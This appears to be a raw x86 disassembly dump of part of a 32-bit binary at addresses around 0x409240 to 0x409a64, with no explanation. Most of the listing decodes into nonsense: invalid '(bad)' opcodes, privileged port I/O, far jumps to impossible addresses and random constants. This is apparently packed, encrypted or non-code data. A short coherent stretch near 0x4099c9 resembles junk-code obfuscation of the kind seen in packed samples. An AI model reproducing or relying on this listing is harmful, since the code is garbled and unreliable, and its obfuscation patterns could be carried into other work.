  409240:	in     eax,dx
  409241:	xchg   esp,eax
  409242:	pop    edi
  409243:	push   es
  409244:	cdq    
  409245:	test   al,0x30
  409247:	scas   eax,DWORD PTR es:[edi]
  409248:	jecxz  0x40920b
  40924a:	pop    ebx
  40924b:	mov    esp,DWORD PTR [eax+0x34df69df]
  409251:	std    
  409252:	inc    ecx
  409253:	jmp    0xb4922807
  409258:	jle    0x4092ae
  40925a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40925b:	xor    esp,DWORD PTR [esi-0xd]
  40925e:	ja     0x40921d
  409260:	pusha  
  409261:	jg     0x4091fc
  409263:	mov    dh,0x15
  409265:	imul   ecx,edx,0x24926222
  40926b:	mov    ch,cl
  40926d:	(bad)  
  40926e:	repz test ebp,ebx
  409271:	repnz arpl WORD PTR [ebx+0x534a3951],ax
  409278:	test   DWORD PTR [ebx+0x4b58d624],ecx
  40927e:	push   ecx
  40927f:	mov    ah,al
  409281:	fucom  st(4)
  409283:	add    DWORD PTR [ecx-0x31],ebx
  409286:	add    ebx,ecx
  409288:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40928a:	std    
  40928b:	mov    al,ds:0xa473d453
  409290:	(bad)  
  409292:	jne    0x409296
  409294:	mov    ds:0x742217c6,al
  409299:	jl     0x40921f
  40929b:	repz aad 0x4a
  40929e:	mov    bl,0xe
  4092a0:	repz push edi
  4092a2:	jp     0x4092fc
  4092a4:	lock sub eax,0x707de664
  4092aa:	cli    
  4092ab:	mov    al,ds:0x6f7320fc
  4092b0:	lds    ebx,FWORD PTR [ebx-0x48c59508]
  4092b6:	sub    al,dh
  4092b8:	push   ss
  4092b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092ba:	pop    esp
  4092bb:	push   ebx
  4092bc:	inc    ebp
  4092bd:	cmp    DWORD PTR [edx-0x6e349a6c],esi
  4092c3:	aaa    
  4092c4:	pop    ss
  4092c5:	hlt    
  4092c6:	jp     0x4092f0
  4092c8:	mov    cl,dh
  4092ca:	int3   
  4092cb:	mov    ss,WORD PTR [edx]
  4092cd:	fist   DWORD PTR [ecx+0x163aaefd]
  4092d3:	mov    edx,0x4fcfbe08
  4092d8:	out    dx,eax
  4092d9:	repnz stos BYTE PTR es:[edi],al
  4092db:	inc    ebx
  4092dc:	stos   BYTE PTR es:[edi],al
  4092dd:	pushw  0x20a
  4092e1:	pushf  
  4092e2:	call   0x406b:0x55664a0b
  4092e9:	xchg   edi,eax
  4092ea:	aas    
  4092eb:	pop    eax
  4092ec:	and    edx,ebp
  4092ee:	and    eax,0xa23d1a10
  4092f3:	iret   
  4092f4:	xchg   edx,eax
  4092f5:	xor    DWORD PTR [ecx],ecx
  4092f7:	pusha  
  4092f8:	ds cmp al,0x67
  4092fb:	and    eax,edx
  4092fd:	add    BYTE PTR [ebp+0x30ff9abe],0x8d
  409304:	add    eax,0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	jmp    0x70e2:0x274259c8
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x40939f
  40933a:	mov    ds:0x6675025a,eax
  40933f:	jl     0x4092c6
  409341:	dec    edi
  409342:	cwde   
  409343:	push   ds
  409344:	or     DWORD PTR ds:0xb688d061,esi
  40934a:	ret    
  40934b:	das    
  40934c:	les    edi,FWORD PTR [ecx-0x40]
  40934f:	xchg   esi,eax
  409350:	out    0x12,eax
  409352:	mov    ebp,0x71fbbf41
  409357:	xlat   BYTE PTR ds:[ebx]
  409358:	sbb    dh,dl
  40935a:	mov    WORD PTR [ebx+0x7a],fs
  40935d:	sub    al,0xc6
  40935f:	or     edx,edi
  409361:	movd   DWORD PTR [edi],mm6
  409364:	jo     0x4092fe
  409366:	inc    esp
  409367:	es cli 
  409369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40936a:	shr    DWORD PTR ds:0x153c42ec,0x4e
  409371:	dec    eax
  409372:	push   ebx
  409373:	sar    DWORD PTR [eax-0x62],0x53
  409377:	mov    dh,0x2e
  409379:	cwde   
  40937a:	into   
  40937b:	aam    0xd9
  40937d:	add    eax,0x3d1e309f
  409382:	pop    ss
  409383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409384:	rcr    BYTE PTR [edx],0x51
  409387:	mov    bl,0x71
  409389:	dec    edi
  40938a:	cmp    bh,BYTE PTR [edx-0x4dad48fd]
  409390:	xor    eax,0x1b753fbf
  409395:	lds    ecx,FWORD PTR [ebp-0x1f107a6f]
  40939b:	jb     0x40938c
  40939d:	imul   BYTE PTR [eax]
  40939f:	mov    BYTE PTR [eax+0x78ef5fea],al
  4093a5:	sti    
  4093a6:	shl    BYTE PTR [eax+0x4a],0x84
  4093aa:	test   eax,0xadb2b668
  4093af:	adc    DWORD PTR [ebx+0x3aa23df4],0xeda09746
  4093b9:	aaa    
  4093ba:	aaa    
  4093bb:	fwait
  4093bc:	retf   
  4093bd:	sahf   
  4093be:	xchg   ebx,eax
  4093bf:	mov    edx,0xb77a5889
  4093c4:	add    al,ah
  4093c6:	push   0x1e
  4093c8:	imul   eax,DWORD PTR [esi],0xe467648d
  4093ce:	jo     0x4093d5
  4093d0:	xchg   edi,eax
  4093d1:	(bad)
  4093d4:	sbb    bh,BYTE PTR [esi+0xe]
  4093d7:	inc    edx
  4093d8:	fucomip st,st(4)
  4093da:	jle    0x40943b
  4093dc:	push   ebx
  4093dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093de:	fstp   TBYTE PTR [eax-0x45]
  4093e1:	je     0x4093a5
  4093e3:	repnz pushf 
  4093e5:	push   cs
  4093e6:	and    ah,ch
  4093e8:	mov    ds:0xd57f0d9f,al
  4093ed:	add    BYTE PTR [ecx+0x2b22758d],0xd1
  4093f4:	cld    
  4093f5:	add    DWORD PTR [edx],0x78ba4001
  4093fb:	mov    ebp,0xd8152bac
  409400:	push   ds
  409401:	jecxz  0x4093f7
  409403:	xchg   edi,eax
  409404:	outs   dx,BYTE PTR ds:[esi]
  409405:	jbe    0x409420
  409407:	add    eax,0xe55560c3
  40940c:	loopne 0x409446
  40940e:	pop    ss
  40940f:	ret    
  409410:	xor    ebp,0x5af71b4b
  409416:	inc    edx
  409417:	or     eax,0x82f5151
  40941c:	fidivr DWORD PTR [edx]
  40941e:	lock rol DWORD PTR [edi-0x16],cl
  409422:	mov    edi,0xf1a4f7fa
  409427:	pop    esp
  409428:	mov    ecx,0x143d018e
  40942d:	mov    edi,0xfbd1521
  409432:	and    DWORD PTR [esi-0x75978e1c],0x20fb4827
  40943c:	mov    ecx,ds
  40943e:	xor    dh,BYTE PTR [edi]
  409440:	pop    ss
  409441:	jo     0x409460
  409443:	outs   dx,DWORD PTR ds:[esi]
  409444:	mov    edx,0x8ded32a4
  409449:	hlt    
  40944a:	fs mov bl,0x5b
  40944d:	add    eax,0xffffffb3
  409450:	dec    ebx
  409451:	(bad)  
  409452:	iret   
  409453:	aaa    
  409454:	sub    eax,0xa3fc5b23
  409459:	jmp    0x4c9fa2a2
  40945e:	sti    
  40945f:	mov    ecx,0x8a865114
  409464:	repz pop ecx
  409466:	mov    eax,0xef26d871
  40946b:	cld    
  40946c:	or     eax,0x8ddd5973
  409471:	mov    eax,ds:0x7dbcb642
  409476:	scas   eax,DWORD PTR es:[edi]
  409477:	div    BYTE PTR [ebp+eiz*1-0x64]
  40947b:	xchg   DWORD PTR [esi],eax
  40947d:	test   DWORD PTR [edx-0x3355be4],ebx
  409483:	jmp    0xaa7:0x14593ee4
  40948a:	in     al,dx
  40948b:	xchg   esp,eax
  40948c:	dec    esi
  40948d:	dec    eax
  40948e:	push   0x83784bbc
  409493:	lahf   
  409494:	mov    esp,ds
  409496:	sahf   
  409497:	stos   DWORD PTR es:[edi],eax
  409498:	shl    BYTE PTR fs:[eax-0x2c0f78ae],cl
  40949f:	jns    0x4094bf
  4094a1:	push   ss
  4094a2:	popf   
  4094a3:	jno    0x409493
  4094a5:	mov    dl,BYTE PTR [ecx]
  4094a7:	push   edx
  4094a8:	out    0x2b,eax
  4094aa:	cmp    bl,dh
  4094ac:	adc    eax,0x720979d8
  4094b1:	sbb    al,0xb5
  4094b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094b4:	scas   eax,DWORD PTR es:[edi]
  4094b5:	sub    al,0x34
  4094b7:	mov    bh,0xa1
  4094b9:	and    esp,DWORD PTR [edi]
  4094bb:	popf   
  4094bc:	shl    BYTE PTR [edx+edx*2],1
  4094bf:	and    BYTE PTR [ecx],bl
  4094c1:	sub    al,0xa6
  4094c3:	mov    al,ds:0xe5b33cb5
  4094c8:	xchg   DWORD PTR [ebp-0x27d7a68f],edx
  4094ce:	rcr    DWORD PTR [ebp+0x5e7b7bb2],cl
  4094d4:	push   ss
  4094d5:	push   ecx
  4094d6:	pop    edi
  4094d7:	pop    edi
  4094d8:	sti    
  4094d9:	pop    esi
  4094da:	or     al,0x24
  4094dc:	shr    DWORD PTR [edx+0x78],0x38
  4094e0:	aas    
  4094e1:	push   edx
  4094e2:	dec    edi
  4094e3:	push   esi
  4094e4:	cdq    
  4094e5:	ja     0x4094a0
  4094e7:	fwait
  4094e8:	push   ecx
  4094e9:	shl    dh,cl
  4094eb:	nop
  4094ec:	into   
  4094ed:	(bad)  [ebp-0x12]
  4094f0:	add    bl,BYTE PTR [eax-0x554e36fc]
  4094f6:	pop    esi
  4094f7:	sub    ebp,DWORD PTR [ecx+ecx*8]
  4094fa:	call   0xcc64:0x7e936f25
  409501:	dec    ebp
  409502:	(bad)  
  409503:	fbstp  TBYTE PTR [esi-0x978b33a]
  409509:	ror    cl,0x54
  40950c:	arpl   WORD PTR [ecx],dx
  40950e:	nop
  40950f:	cmp    eax,0xfd750344
  409514:	retf   0x5fe4
  409517:	and    BYTE PTR [edi+eax*2],ch
  40951a:	bound  eax,QWORD PTR [eax+0x51ecbe17]
  409520:	pop    edi
  409521:	jae    0x4094a4
  409523:	or     al,0x33
  409525:	mov    ecx,DWORD PTR [ebp-0x3f464cb5]
  40952b:	xchg   ecx,eax
  40952c:	test   eax,0x7627d91a
  409531:	aas    
  409532:	fdivr  DWORD PTR [bp+di]
  409535:	sti    
  409536:	push   ss
  409537:	xchg   ecx,eax
  409538:	add    cl,dl
  40953a:	jno    0x4094cb
  40953c:	cld    
  40953d:	pop    esp
  40953e:	inc    esp
  40953f:	add    cl,BYTE PTR [esi]
  409541:	xchg   esp,eax
  409542:	ret    
  409543:	sbb    BYTE PTR [eax],dh
  409545:	out    0xe0,al
  409547:	cld    
  409548:	cmp    BYTE PTR [edi-0x47],ah
  40954b:	stos   DWORD PTR es:[edi],eax
  40954c:	dec    BYTE PTR [ebx]
  40954e:	jns    0x409594
  409550:	cmc    
  409551:	push   ecx
  409552:	add    edi,DWORD PTR [edi-0xe]
  409555:	sar    al,1
  409557:	pop    ebx
  409558:	sub    eax,0x17f1ca75
  40955d:	pop    esp
  40955e:	cmc    
  40955f:	xor    DWORD PTR [eax+0x1b476f11],ebp
  409565:	jmp    0x1cc3622e
  40956a:	xor    ebp,edx
  40956c:	push   cs
  40956d:	mov    al,ds:0x12997a2a
  409572:	out    dx,eax
  409573:	scas   eax,DWORD PTR es:[edi]
  409574:	sti    
  409575:	retf   
  409576:	out    dx,al
  409577:	sub    eax,0xb7616d7a
  40957c:	xchg   ecx,eax
  40957d:	test   al,0xb0
  40957f:	mov    ch,0xf7
  409581:	dec    ecx
  409582:	cmp    cl,BYTE PTR es:[ebx+eiz*8]
  409586:	out    0xcc,eax
  409588:	jp     0x4095be
  40958a:	add    ch,BYTE PTR ds:0x9ba2680d
  409590:	pop    ds
  409591:	xchg   ecx,eax
  409592:	in     al,0xd8
  409594:	ja     0x4095d0
  409596:	dec    edx
  409597:	and    ebx,DWORD PTR [ecx+eiz*1-0x1d]
  40959b:	fist   DWORD PTR [eax]
  40959d:	shr    BYTE PTR [edi-0x7],cl
  4095a0:	cli    
  4095a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095a2:	retf   
  4095a3:	bound  ebp,QWORD PTR [edx+0x4e]
  4095a6:	jmp    0x4095d6
  4095a8:	lods   al,BYTE PTR ds:[esi]
  4095a9:	imul   ebp,DWORD PTR [esi],0x3d085e99
  4095af:	and    al,0x0
  4095b1:	dec    ecx
  4095b2:	jg     0x4095fe
  4095b4:	out    dx,al
  4095b5:	fnstenv ss:[ebx-0x75]
  4095b9:	js     0x409628
  4095bb:	sar    BYTE PTR [esi+0x63313b9f],1
  4095c1:	mov    ss,WORD PTR [ebp+ecx*8+0x27]
  4095c5:	retf   
  4095c6:	fdivr  QWORD PTR [ecx+0x1a]
  4095c9:	ficomp WORD PTR [ebx]
  4095cb:	daa    
  4095cc:	ror    BYTE PTR [ecx-0x2e86d521],0xa
  4095d3:	add    esp,eax
  4095d5:	pop    ss
  4095d6:	jl     0x409654
  4095d8:	mov    edi,0x34548d0e
  4095dd:	adc    eax,0xb900a56c
  4095e2:	(bad)  
  4095e4:	shr    DWORD PTR [edi+0x3e1f216c],cl
  4095ea:	push   ds
  4095eb:	push   esi
  4095ec:	pop    edi
  4095ed:	paddusw mm6,mm3
  4095f0:	pop    es
  4095f1:	jae    0x40964e
  4095f3:	sub    bl,0x7f
  4095f6:	iret   
  4095f7:	int    0xc0
  4095f9:	xor    BYTE PTR [edx],bl
  4095fb:	scas   al,BYTE PTR es:[edi]
  4095fc:	dec    edx
  4095fd:	sub    bl,BYTE PTR es:[edi-0x5a808144]
  409604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409605:	aam    0xd5
  409607:	loop   0x409657
  409609:	pop    es
  40960a:	popf   
  40960b:	mov    dl,0x1f
  40960d:	mul    DWORD PTR [edi-0x3523db7]
  409613:	aaa    
  409614:	pop    esi
  409615:	xor    ebx,DWORD PTR [eax+ecx*4-0x384ad639]
  40961c:	imul   ecx,DWORD PTR [edx-0x34],0xf19104b5
  409623:	add    BYTE PTR [eax],bl
  409625:	clc    
  409626:	ret    
  409627:	xor    al,0xfe
  409629:	hlt    
  40962a:	ret    
  40962b:	cld    
  40962c:	fisubr WORD PTR [ecx+0x6ad184bb]
  409632:	imul   ecx,DWORD PTR [edx+edi*1+0x63],0x7d
  409637:	and    ah,BYTE PTR [ebx-0x65]
  40963a:	adc    al,0x5f
  40963c:	add    esp,DWORD PTR cs:[ebx]
  40963f:	(bad)  
  409640:	xchg   esi,eax
  409641:	cmp    DWORD PTR [edx+0x2],ebx
  409644:	mov    esp,0xa298b3fb
  409649:	sub    BYTE PTR [edi-0x69c09f0c],0xa4
  409650:	fldenv [ebx]
  409652:	call   0xe28d:0x266fd88a
  409659:	bound  esp,QWORD PTR [ebx+0x7b]
  40965c:	pop    ds
  40965d:	pop    esi
  40965e:	(bad)  
  40965f:	aam    0x7
  409661:	or     eax,0x18c65f18
  409666:	push   eax
  409667:	sbb    al,0x81
  409669:	call   DWORD PTR [eax+0x1]
  40966c:	mov    eax,DWORD PTR [ebp-0x20]
  40966f:	mov    ecx,DWORD PTR ds:0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR ds:0xd79cb8b6,ebp
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x40965f
  409693:	cdq    
  409694:	aad    0xb1
  409696:	mov    cl,0x9e
  409698:	xlat   BYTE PTR cs:[ebx]
  40969a:	popf   
  40969b:	xchg   ebp,eax
  40969c:	stos   DWORD PTR es:[edi],eax
  40969d:	repz mov ebx,ebp
  4096a0:	sub    al,ah
  4096a2:	mov    bl,0x3d
  4096a4:	push   edi
  4096a5:	(bad)  
  4096a6:	mov    ebp,0xe553c1a2
  4096ab:	imul   eax,DWORD PTR [esi-0x12],0xffffffd7
  4096af:	and    ebx,eax
  4096b1:	or     DWORD PTR [ebp+0x7d6043d],eax
  4096b7:	mov    dl,0x8
  4096b9:	mov    edx,0x4229915e
  4096be:	lods   al,BYTE PTR ds:[esi]
  4096bf:	outs   dx,BYTE PTR ds:[esi]
  4096c0:	inc    edx
  4096c1:	pusha  
  4096c2:	sub    DWORD PTR [ebx],edx
  4096c4:	out    0xed,al
  4096c6:	cmp    eax,0x45af22b5
  4096cb:	jno    0x4096da
  4096cd:	mov    eax,ds:0xd0173642
  4096d2:	xor    eax,0x724ce3d8
  4096d7:	jmp    0x22d8560d
  4096dc:	mov    cl,0xac
  4096de:	dec    ebp
  4096df:	xchg   DWORD PTR ss:[ecx-0x13166a02],edx
  4096e6:	daa    
  4096e7:	pop    ebx
  4096e8:	and    dh,BYTE PTR [esp+eax*2-0x43ba27eb]
  4096ef:	adc    eax,0xf8964a3f
  4096f4:	jo     0x4096b1
  4096f6:	or     al,al
  4096f8:	mov    esp,DWORD PTR [ecx+edi*2]
  4096fb:	push   esi
  4096fc:	es dec edx
  4096fe:	inc    edx
  4096ff:	stos   DWORD PTR es:[edi],eax
  409700:	lahf   
  409701:	into   
  409702:	in     eax,0xb9
  409704:	cmp    BYTE PTR [ebx+0x65],bl
  409707:	dec    ebp
  409708:	les    edx,FWORD PTR [ebx-0x21]
  40970b:	cld    
  40970c:	cmp    ebp,edx
  40970e:	push   0x5bb760f1
  409713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409714:	or     dh,BYTE PTR ds:0x9aaa4305
  40971a:	repnz inc ecx
  40971c:	pop    esi
  40971d:	push   ebx
  40971e:	xchg   edi,eax
  40971f:	aaa    
  409720:	dec    ebp
  409721:	mov    ebp,0x5ea4e5b
  409726:	data16 in al,0xed
  409729:	(bad)  
  40972a:	fstp   QWORD PTR [ecx-0x83596a8]
  409730:	test   eax,0x3497a0fd
  409735:	xor    eax,ebx
  409737:	cmp    esi,edx
  409739:	lds    ebx,FWORD PTR [edx-0x6628844a]
  40973f:	ret    0x5894
  409742:	and    ch,BYTE PTR [ebp+edx*4-0x26]
  409746:	mov    edx,0x30d979ad
  40974b:	aas    
  40974c:	call   0x1a5e3412
  409751:	ins    BYTE PTR es:[edi],dx
  409752:	inc    esp
  409753:	or     al,0x49
  409755:	pop    esi
  409756:	in     eax,dx
  409757:	(bad)  
  409758:	xchg   ebp,eax
  409759:	stos   BYTE PTR es:[edi],al
  40975a:	ror    DWORD PTR [ecx-0x63d19438],1
  409760:	std    
  409761:	shr    BYTE PTR [ebx],cl
  409763:	mov    bh,0x49
  409765:	in     al,0xa0
  409767:	dec    ebp
  409768:	es aad 0xc8
  40976b:	and    DWORD PTR [edi-0x7b7911f1],ebp
  409771:	push   cs
  409772:	sub    BYTE PTR [esi+0x3d5c815d],bl
  409778:	out    0x86,eax
  40977a:	push   eax
  40977b:	addr16 inc esp
  40977d:	jmp    0x56ea:0xfa951ff6
  409784:	mov    bh,0xdc
  409786:	jnp    0x409757
  409788:	jno    0x4097c8
  40978a:	cmc    
  40978b:	or     BYTE PTR [ecx],dh
  40978d:	fs ss int 0x60
  409791:	sub    BYTE PTR [eax],ah
  409793:	dec    ebx
  409794:	shr    BYTE PTR ds:0xef9aee35,cl
  40979a:	gs xchg ebp,eax
  40979c:	(bad)  
  40979d:	pop    ebx
  40979f:	push   esp
  4097a0:	mov    ch,0x4e
  4097a2:	pop    edx
  4097a3:	add    DWORD PTR [eax+0x58e3d013],0x6315a38
  4097ad:	ins    BYTE PTR es:[edi],dx
  4097ae:	push   ebp
  4097af:	inc    edi
  4097b0:	cmp    DWORD PTR [ebp+eiz*4-0x73],edi
  4097b4:	push   ss
  4097b5:	add    BYTE PTR [esi],bh
  4097b7:	jle    0x40974e
  4097b9:	call   0xda4d:0x4028a7a5
  4097c0:	mov    edx,0x3bda2fbe
  4097c5:	sub    ah,BYTE PTR [edx-0x2e81ab47]
  4097cb:	enter  0xee44,0xaf
  4097cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097d0:	(bad)  
  4097d2:	mov    ah,0x5c
  4097d4:	test   eax,0xb1be92c0
  4097d9:	jp     0x409839
  4097db:	xor    esi,0xc464aad
  4097e1:	lock and DWORD PTR [eax],edx
  4097e4:	out    0xdf,eax
  4097e6:	mov    esi,0xea0557eb
  4097eb:	pop    esi
  4097ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097ed:	out    dx,eax
  4097ee:	int    0x3a
  4097f0:	sti    
  4097f1:	sbb    esp,DWORD PTR [ebx+0x5a]
  4097f4:	fist   WORD PTR [edi+0x6d]
  4097f7:	xchg   ecx,eax
  4097f8:	push   ebx
  4097f9:	sub    BYTE PTR [ebx+eiz*1-0x54a649e3],ch
  409800:	ss jns 0x4097f0
  409803:	push   esi
  409804:	mov    ecx,0x43a0dbf
  409809:	mov    dh,0x4f
  40980b:	lods   eax,DWORD PTR ds:[esi]
  40980c:	ins    BYTE PTR es:[edi],dx
  40980d:	xor    al,0x67
  40980f:	data16 loop 0x40979e
  409812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409813:	dec    esp
  409815:	pop    sp
  409817:	and    BYTE PTR [edi-0x63fa5c26],ch
  40981d:	inc    edx
  40981e:	popf   
  40981f:	lods   eax,DWORD PTR ds:[esi]
  409820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409821:	in     eax,dx
  409822:	mov    ebx,0x79577522
  409827:	sar    BYTE PTR [ecx+0x55df1600],cl
  40982d:	sub    ah,BYTE PTR [edx]
  40982f:	outs   dx,BYTE PTR ds:[esi]
  409830:	dec    ebx
  409831:	mov    dh,0xce
  409833:	push   ss
  409834:	fistp  QWORD PTR [esi+0x62]
  409837:	ror    BYTE PTR [ecx+ecx*1-0x7a50cc8f],0xb9
  40983f:	mov    al,0x3f
  409841:	push   0x24d221de
  409846:	das    
  409847:	out    dx,eax
  409848:	xor    ebp,eax
  40984a:	bound  edx,QWORD PTR [ebp+0x777da388]
  409850:	ja     0x4098a3
  409852:	bound  edi,QWORD PTR [ebp+0x6e70b2e2]
  409858:	push   eax
  409859:	in     eax,dx
  40985a:	push   es
  40985b:	mov    BYTE PTR [edi-0x2a77c1e],bh
  409861:	into   
  409862:	add    cl,0x55
  409865:	mov    al,ds:0xcb4fa07e
  40986a:	or     ch,BYTE PTR [esi-0x7a60377e]
  409870:	pop    ebp
  409871:	dec    esp
  409872:	(bad)  
  409873:	rol    BYTE PTR [edx],0x57
  409876:	ret    0xf03c
  409879:	push   esi
  40987a:	aas    
  40987b:	jbe    0x409808
  40987d:	sub    al,0x67
  40987f:	cs dec ebp
  409881:	fmul   QWORD PTR [ecx+0x616649a2]
  409887:	fcmovnu st,st(0)
  409889:	sub    esp,DWORD PTR [ecx+0x18]
  40988c:	pop    ss
  40988d:	mov    esi,0xb77da79c
  409892:	inc    edx
  409893:	pop    edx
  409894:	inc    ebp
  409895:	and    eax,0x29607250
  40989a:	adc    ah,0xbc
  40989d:	mov    ds:0xd0704468,eax
  4098a2:	mov    ch,0x9d
  4098a5:	mov    dh,0xdb
  4098a7:	ds cmc 
  4098a9:	mov    edx,0x4d187366
  4098ae:	and    DWORD PTR [eax+0x5b],0x54bb4c27
  4098b5:	and    eax,0x2654d33e
  4098ba:	(bad)  
  4098bb:	in     eax,0x80
  4098bd:	int3   
  4098be:	xor    DWORD PTR [esi+0x652ec633],edi
  4098c4:	inc    esi
  4098c5:	mov    dh,0x77
  4098c7:	div    DWORD PTR [ebx+0x613616b9]
  4098cd:	add    cl,BYTE PTR [bx+si-0x60]
  4098d1:	and    cl,bh
  4098d3:	stc    
  4098d4:	mov    cl,0x5e
  4098d6:	and    eax,DWORD PTR [edi+0x1f38abf7]
  4098dc:	rcr    BYTE PTR [esi],cl
  4098de:	xor    BYTE PTR [ebx+0x5893c44c],ch
  4098e4:	out    dx,eax
  4098e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098e6:	leave  
  4098e7:	imul   ebx,DWORD PTR [edi+eiz*2],0xb8345601
  4098ee:	xchg   ecx,eax
  4098ef:	and    al,0x40
  4098f1:	addr16 enter 0xa3ab,0x87
  4098f6:	retf   
  4098f7:	jl     0x409966
  4098f9:	jg     0x409977
  4098fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098fc:	cdq    
  4098fd:	pop    ebp
  4098fe:	cld    
  4098ff:	(bad)  
  409900:	aaa    
  409901:	mov    ebx,0xe9c3167b
  409906:	test   al,0x7
  409908:	sbb    BYTE PTR [esi+0x53a626c2],0xe3
  40990f:	popa   
  409910:	sub    dh,dl
  409912:	pop    es
  409913:	inc    ecx
  409914:	pop    ebx
  409915:	sbb    dl,BYTE PTR [ebx+edx*1+0x7a]
  409919:	sub    DWORD PTR [edi],edx
  40991b:	aam    0xdd
  40991d:	push   0xcf30b8d4
  409922:	xchg   edi,eax
  409923:	call   0xee3d:0xf9631f9
  40992a:	xchg   ebx,eax
  40992b:	retf   
  40992c:	ss cs aam 0xc2
  409930:	rcr    esp,cl
  409932:	aam    0xbd
  409934:	inc    ebp
  409935:	sbb    al,0x3a
  409937:	in     al,0x3c
  409939:	add    ecx,edx
  40993b:	add    dl,al
  40993d:	jmp    0x216:0x5fa48b7f
  409944:	daa    
  409945:	push   ebx
  409946:	add    eax,0x9f9d3421
  40994b:	dec    ebx
  40994c:	aam    0xf7
  40994e:	xor    BYTE PTR es:[ebx-0x3e],ah
  409952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409953:	xor    edi,DWORD PTR ds:0x3bfc3882
  409959:	rep stos BYTE PTR es:[edi],al
  40995b:	ins    DWORD PTR es:[edi],dx
  40995c:	push   edx
  40995e:	push   es
  40995f:	das    
  409960:	jl     0x4099bd
  409962:	(bad)  
  409963:	dec    ebp
  409964:	imul   ecx,DWORD PTR [edx+ebp*2],0x7cdbe031
  40996b:	test   BYTE PTR [ebp-0x5b150540],dh
  409971:	std    
  409972:	retf   
  409973:	retf   0x341c
  409976:	cwde   
  409977:	pop    ebp
  409978:	out    dx,al
  409979:	mov    ?,edi
  40997b:	cmp    eax,0x6a614ee5
  409980:	mov    WORD PTR [ecx],ds
  409982:	ret    
  409983:	mov    cl,0x1b
  409985:	cmp    DWORD PTR [ebp+0x289af2c1],0x79
  40998c:	leave  
  40998d:	call   FWORD PTR [edx]
  40998f:	lahf   
  409990:	enter  0x6103,0xff
  409994:	jle    0x40995b
  409996:	pop    ds
  409997:	data16 (bad) 
  409999:	sub    al,0x21
  40999b:	clc    
  40999c:	mov    BYTE PTR [esi+0x36],ah
  40999f:	lock aam 0x84
  4099a2:	xor    bl,cl
  4099a4:	ror    BYTE PTR [eax-0x2d],cl
  4099a7:	mov    cx,0x565e
  4099ab:	mov    ch,0xe7
  4099ad:	add    al,0xae
  4099af:	loope  0x4099f6
  4099b1:	gs std 
  4099b3:	cmp    edx,DWORD PTR [edx+0x55503caf]
  4099b9:	out    0xc3,al
  4099bb:	popf   
  4099bc:	fs iret 
  4099be:	xchg   edx,eax
  4099bf:	(bad)  
  4099c0:	sub    al,0xa2
  4099c2:	add    DWORD PTR [eax],ecx
  4099c4:	pop    edi
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	not    DWORD PTR [eax]
  409a5a:	arpl   WORD PTR [ecx],di
  409a5c:	push   es
  409a5d:	xchg   esp,ebp
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409ab2
